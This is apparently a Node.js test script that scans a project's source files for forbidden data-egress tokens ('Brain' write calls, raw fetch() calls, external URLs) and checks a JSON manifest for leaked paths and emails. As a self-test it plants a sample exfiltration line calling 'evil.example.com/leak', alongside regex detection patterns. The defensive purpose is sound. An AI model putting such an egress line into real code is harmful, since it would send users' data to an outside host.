'use strict';
/*
 * Phase 167-05 Task 1 -- the Part 8 LEAK SCAN over EVERY Phase-167 surface +
 * the re-run planted-secret manifest tripwire (D-167-06, Canon Part 8).
 *
 * This is the leak-net: a forbidden-token scan over ALL Phase-167 lib + script +
 * command + agent surfaces (the manifest generator, recipe-maps, the chain
 * executor, the new-surface generator + command, the framework-runner agent),
 * mirroring the run-all-156.sh BRAIN_WRITE + RAW_FETCH regexes. A comment line
 * cannot self-invalidate the count (comments lead with // or * in CJS, or are
 * stripped) -- the scan filters comment lines before counting, so naming a
 * forbidden token in prose does not trip the gate, and the gate is never a bare
 * unfiltered == 0 over raw bytes.
 *
 * Then it RE-RUNS the planted-secret manifest tripwire: it seeds a room/ path
 * into an IN-MEMORY copy of the manifest, proves the forbidden-value heuristic
 * catches it (RED), and proves the REAL on-disk artifact is clean (GREEN). The
 * scan is the PROOF, not an assertion.
 *
 * House rule: hyphens only, no em-dashes (U+2014 referenced by escape only).
 * node built-ins only. Plain node assert harness.
 */

const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const REPO_ROOT = path.resolve(__dirname, '..');

// EVERY Phase-167 surface: lib + script + command + agent. A new surface that
// opened a Brain-write / raw-fetch path would be caught here.
const SWEEP_TARGETS = [
  'scripts/build-harness-manifest.cjs',
  'lib/core/recipe-maps.cjs',
  'lib/core/chain-executor.cjs',
  'scripts/build-new-surface.cjs',
  'commands/new-surface.md',
  'agents/framework-runner.md',
];

const MANIFEST_ARTIFACT = path.join(REPO_ROOT, 'data', 'harness-manifest.json');

let passed = 0;
let failed = 0;
function ok(name) { passed += 1; process.stdout.write('  PASS ' + name + '\n'); }
function fail(name, err) {
  failed += 1;
  process.stdout.write('  FAIL ' + name + '\n');
  if (err) process.stdout.write('    ' + ((err && err.message) || String(err)) + '\n');
}

// Strip comment lines from source so a doc comment naming a forbidden token does
// NOT self-invalidate the count. For .cjs: lines leading with // or * or /*. For
// .md: a fenced-code or prose line cannot call a function, so we still strip the
// obvious CJS comment leaders (harmless on .md) and rely on the call-SYNTAX regex
// (token + paren) rather than a bare substring. The filter is the guard against a
// comment self-tripping the gate (never a bare unfiltered == 0).
function stripComments(src) {
  return src.split('\n').filter((line) => {
    const t = line.trim();
    if (t.startsWith('//')) return false;
    if (t.startsWith('*')) return false;
    if (t.startsWith('/*')) return false;
    return true;
  }).join('\n');
}

// The forbidden tokens (mirror the run-all-156.sh BRAIN_WRITE + RAW_FETCH).
//   - a Brain-WRITE MCP call / brain-write helper (the canonical Part 8 breach)
//   - a raw external fetch( egress (egress must go through an audited chokepoint)
//   - a hardcoded external http(s) endpoint (github.com comment URLs allowed)
const BRAIN_WRITE_RX = /mcp__brain_(write|store|upsert|ingest)|writeBrain|sendToBrain|ingestToBrain/;
// fetch( not preceded by a word char or dot (so `.fetchCorpus(` on a chokepoint object is NOT a raw egress).
const RAW_FETCH_RX = /[^A-Za-z0-9_.]fetch\s*\(/;
const EXTERNAL_HTTP_RX = /https?:\/\//;
const GITHUB_RX = /github\.com/;

// ---------------------------------------------------------------------------
// CHECK 1 -- the leak scan over every Phase-167 surface (comment-filtered).
// ---------------------------------------------------------------------------
(function check1_leakScan() {
  const label = 'CHECK 1 - zero Brain-write / raw-fetch / external-http tokens across every Phase-167 surface (comment-filtered)';
  try {
    const breaches = [];
    for (const rel of SWEEP_TARGETS) {
      const abs = path.join(REPO_ROOT, rel);
      assert.ok(fs.existsSync(abs), label + ': sweep target missing: ' + rel);
      const raw = fs.readFileSync(abs, 'utf8');
      const code = stripComments(raw);

      if (BRAIN_WRITE_RX.test(code)) breaches.push(rel + ' -> Brain-write token');
      if (RAW_FETCH_RX.test(code)) breaches.push(rel + ' -> raw fetch( egress');
      // external http(s): scan code lines, allow github.com comment/reference URLs.
      const httpLines = code.split('\n').filter((ln) => EXTERNAL_HTTP_RX.test(ln) && !GITHUB_RX.test(ln));
      if (httpLines.length > 0) breaches.push(rel + ' -> external http(s) endpoint (' + httpLines.length + ' line(s))');
    }
    assert.equal(breaches.length, 0,
      label + ': forbidden token(s) found:\n    ' + breaches.join('\n    '));
    ok(label + ' (' + SWEEP_TARGETS.length + ' surfaces)');
  } catch (e) { fail(label, e); }
})();

// ---------------------------------------------------------------------------
// CHECK 2 -- the scan ITSELF is sharp: prove it WOULD catch a planted Brain-write
// (adversarial self-test, so a regex that silently matched nothing cannot pass).
// ---------------------------------------------------------------------------
(function check2_scanIsSharp() {
  const label = 'CHECK 2 - the leak scan catches a planted Brain-write / raw-fetch (the scan is sharp, not a no-op)';
  try {
    const PLANTED_BRAIN = 'const x = mcp__brain_write({ node: foo });';
    const PLANTED_FETCH = 'const y = fetch("http://evil.example.com/leak");';
    assert.ok(BRAIN_WRITE_RX.test(stripComments(PLANTED_BRAIN)),
      label + ': the BRAIN_WRITE regex did NOT catch a planted mcp__brain_write call');
    assert.ok(RAW_FETCH_RX.test(stripComments(PLANTED_FETCH)),
      label + ': the RAW_FETCH regex did NOT catch a planted raw fetch( egress');
    // and a chokepoint .fetchCorpus( is NOT a raw egress (no false positive).
    assert.ok(!RAW_FETCH_RX.test('corpus.fetchCorpus(query)'),
      label + ': the RAW_FETCH regex false-positived on a .fetchCorpus( chokepoint call');
    // and a comment naming the token is NOT a breach (comment-filtered).
    assert.ok(!BRAIN_WRITE_RX.test(stripComments('// never call mcp__brain_write here')),
      label + ': a comment naming mcp__brain_write tripped the gate (not comment-filtered)');
    ok(label);
  } catch (e) { fail(label, e); }
})();

// ---------------------------------------------------------------------------
// CHECK 3 -- the re-run planted-secret manifest tripwire. Seed a room/ path into
// an in-memory copy of the real manifest, prove the heuristic catches it (RED),
// then prove the REAL on-disk artifact is clean (GREEN).
// ---------------------------------------------------------------------------
const FREE_TEXT_CAP = 120;
const ROOM_PATH_RX = /(^|[\/\s-])rooms?\/[A-Za-z0-9._-]/i;
const EMAIL_RX = /[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/;
function forbiddenValueReason(value) {
  if (typeof value !== 'string') return '';
  if (ROOM_PATH_RX.test(value)) return 'room/ path segment';
  if (EMAIL_RX.test(value)) return 'at-sign email pattern';
  if (value.length > FREE_TEXT_CAP) return 'free text over the ' + FREE_TEXT_CAP + '-char cap';
  return '';
}
function walkStringValues(value, visit, p) {
  const pathStr = p || '$';
  if (typeof value === 'string') { visit(value, pathStr); return; }
  if (Array.isArray(value)) { value.forEach((v, i) => walkStringValues(v, visit, pathStr + '[' + i + ']')); return; }
  if (value && typeof value === 'object') {
    for (const k of Object.keys(value)) walkStringValues(value[k], visit, pathStr + '.' + k);
  }
}
function sweepManifest(manifest) {
  const hits = [];
  walkStringValues(manifest.maps || [], (str, p) => {
    const reason = forbiddenValueReason(str);
    if (reason) hits.push('maps' + p.slice(1) + ' -> ' + reason + ' :: ' + JSON.stringify(str.slice(0, 60)));
  });
  return hits;
}

(function check3_plantedSecretTripwire() {
  const label = 'CHECK 3 - planted-secret manifest tripwire: heuristic catches a seeded room/ path (RED) + real artifact clean (GREEN)';
  try {
    // RED: prove the heuristic catches each planted user-content kind.
    const PLANTED = [
      'room/problem-definition/financial-model.md',
      'lawrence@example.com',
      'x'.repeat(FREE_TEXT_CAP + 1),
    ];
    for (const v of PLANTED) {
      assert.ok(forbiddenValueReason(v) !== '',
        label + ': the heuristic did NOT catch a planted secret value: ' + JSON.stringify(v.slice(0, 40)));
    }

    // seed a room/ path into an IN-MEMORY copy of the real manifest, prove the sweep surfaces it.
    const real = JSON.parse(fs.readFileSync(MANIFEST_ARTIFACT, 'utf8'));
    const poisoned = JSON.parse(JSON.stringify(real));
    assert.ok(Array.isArray(poisoned.maps) && poisoned.maps.length === 3,
      label + ': the manifest does not have the three maps to poison');
    poisoned.maps[0].path = 'room/secret/leak.md';
    const poisonedHits = sweepManifest(poisoned);
    assert.ok(poisonedHits.length >= 1,
      label + ': the sweep over the POISONED manifest found zero hits (it would miss a planted leak)');

    // GREEN: the REAL on-disk artifact is clean (no maps value trips the heuristic).
    const realHits = sweepManifest(real);
    assert.equal(realHits.length, 0,
      label + ': the REAL manifest carries ' + realHits.length + ' forbidden value(s):\n    ' + realHits.join('\n    '));

    ok(label);
  } catch (e) { fail(label, e); }
})();

// ---------------------------------------------------------------------------
// CHECK 4 -- no em-dash in this scan's own surfaces (HARD RULE).
// ---------------------------------------------------------------------------
(function check4_noEmDash() {
  const label = 'CHECK 4 - no em-dash in the leak-scan surfaces + this test (HARD RULE)';
  try {
    const EM_DASH = String.fromCharCode(0x2014);
    const files = SWEEP_TARGETS.map((r) => path.join(REPO_ROOT, r)).concat([__filename]);
    const hits = [];
    for (const f of files) {
      if (fs.existsSync(f) && fs.readFileSync(f, 'utf8').includes(EM_DASH)) hits.push(path.basename(f));
    }
    assert.equal(hits.length, 0, label + ': em-dash found in: ' + hits.join(', '));
    ok(label);
  } catch (e) { fail(label, e); }
})();

process.stdout.write('\n');
process.stdout.write('harness-167 Part-8 leak scan: ' + passed + ' passed, ' + failed + ' failed (4 checks)\n');
process.exit(failed === 0 ? 0 : 1);
